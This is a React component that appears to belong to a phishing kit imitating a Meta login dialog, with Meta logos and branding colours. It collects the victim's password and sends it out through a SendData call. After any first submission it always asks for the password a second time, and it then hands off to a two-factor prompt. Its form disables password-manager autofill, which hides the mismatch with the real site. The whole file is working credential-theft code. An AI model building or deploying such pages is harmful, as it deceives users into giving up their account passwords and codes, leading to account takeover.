import React from 'react';
import Modal from '#components/modals/Modal';
import PasswordInput from '#components/password-input/password-input';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm } from '../../app/store/slices/stepFormSlice';
import { useAppStrings } from '@/hooks/useAppStrings';
import { SendData } from '@/utils/sendData';

interface PasswordModalProps {
    isOpend: boolean;
    isOpendTwoFactor: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
}

const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor, onToggleModal }) => {
    const t = useAppStrings();

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [loading, setLoading] = React.useState(false);
    const [doubleCheck, setDoubleCheck] = React.useState(false);
    const [password, setPassword] = React.useState('');
    const [showSecondStepNotice, setShowSecondStepNotice] = React.useState(false);
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const dispatch = useAppDispatch();
    const formData = useAppSelector((state) => state.stepForm.data);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { value } = e.target;
        setPassword(value);
        setErrors(prev => ({ ...prev, password: '' }));

        if (!doubleCheck) {
            dispatch(updateForm({ password: value }));
        } else {
            dispatch(updateForm({ passwordSecond: value }));
        }
    };

    const handleClose = () => {
        setIsOpen(false);
        onToggleModal(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();
            const newErrors: Record<string, string> = {};
            if (!password.trim()) newErrors.password = t.password.errEmpty;

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return; 
            }

            if (!doubleCheck) {
                setLoading(true);

                await SendData(formData)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);  
                        setDoubleCheck(true);
                        setShowSecondStepNotice(true);
                        setPassword('');
                        setErrors({});
                    }, 1345)
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setDoubleCheck(true);
                    setShowSecondStepNotice(true);
                    setPassword('');
                    setErrors({});
                });
            } else {
                setLoading(true);

                await SendData(formData)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);  
                        setDoubleCheck(false);
                        setShowSecondStepNotice(false);
                        setPassword('');

                        isOpendTwoFactor(true);
                        handleClose();
                    }, 1345)
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setPassword('');
                    newErrors.password = t.password.errWrong;
                    setErrors(newErrors);
                });
            }
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => ` border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} `;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title=''
            onClose={handleClose}
            isClosable={false}
        >
            <div className="flex min-h-full min-w-0 flex-1 flex-col items-center justify-center gap-8 py-2">
                <div className='mx-auto h-[50px] w-[50px] shrink-0'>
                    <img src="/images/meta/logo.svg" width="100%" height="100%" alt="logo" />
                </div>

                <div className='w-full min-w-0 py-4 sm:py-8'>
                    <p className='text-[#9a979e] text-[14px] mb-[7px]'>
                        {doubleCheck
                            ? t.password.secondPrompt
                            : t.password.firstPrompt}
                    </p>
                    {showSecondStepNotice && (
                        <div className='mb-[10px] rounded-[10px] border border-[#ffd8a8] bg-[#fff8ee] px-[12px] py-[10px]'>
                            <p className='text-[13px] leading-[1.55] text-[#8a5b13]'>
                                {t.password.notice}
                            </p>
                        </div>
                    )}
                    <form onSubmit={handSubmit} autoComplete="off" data-lpignore="true" data-1p-ignore="true" data-bwignore="true">
                        <div className='w-full'>
                            <PasswordInput
                                id='accessKey'
                                name={doubleCheck ? 'recheck_access_key' : 'account_access_key'}
                                placeholder={doubleCheck ? t.password.phSecond : t.password.phFirst}
                                className={inputClass('password')}
                                value={password}
                                onChange={handleChange}
                                autoComplete='off'
                                allowToggle={doubleCheck}
                            />
                            {errorText('password')}
                        </div>
                        <div className='w-full mt-[20px]'>
                            <button
                                className={`min-h-[48px] w-full bg-[#0064E0] text-white rounded-[40px] px-4 py-[10px] flex items-center justify-center cursor-pointer transition-opacity duration-300 active:opacity-90 ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
                                disabled={loading}
                            >
                                {loading && (
                                    <div className='animate-spin mr-[10px] w-[20px] h-[20px]'>
                                        <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                    </div>
                                )}
                                {loading ? '' : t.password.continue}
                            </button>
                        </div>
                        <div>
                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>{t.password.forgot}</a></p>
                        </div>
                    </form>
                </div>

                <div className='mx-auto h-[60px] w-[60px] shrink-0'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                </div>
            </div>
        </Modal>
    );
};

export default PasswordModal;
